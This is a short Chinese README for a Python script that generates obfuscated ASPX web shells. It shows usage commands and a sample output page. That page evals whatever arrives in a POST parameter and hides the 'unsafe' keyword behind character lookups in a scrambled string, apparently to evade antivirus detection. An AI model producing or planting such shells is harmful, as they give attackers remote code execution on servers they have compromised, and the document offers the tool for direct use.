## 使用方法

```
python3 aspx-venom.py       //生成

python3 aspx-venom.py >  test.aspx   //保存
```
## 生成样例
```
<%@ Page Language="Jscript" Debug=true%>
<%
var UdIw='hVYFCrBEjfzQsUkdgOReSAKXntawHGiWPvTpqJxmLZbylcuMNDIo';
var YJxe=Request.Form("yzddmr6");
var zIUt=UdIw(13)+UdIw(24)+UdIw(12)+UdIw(21)+UdIw(3)+UdIw(7);
eval(YJxe,zIUt);
%>
```
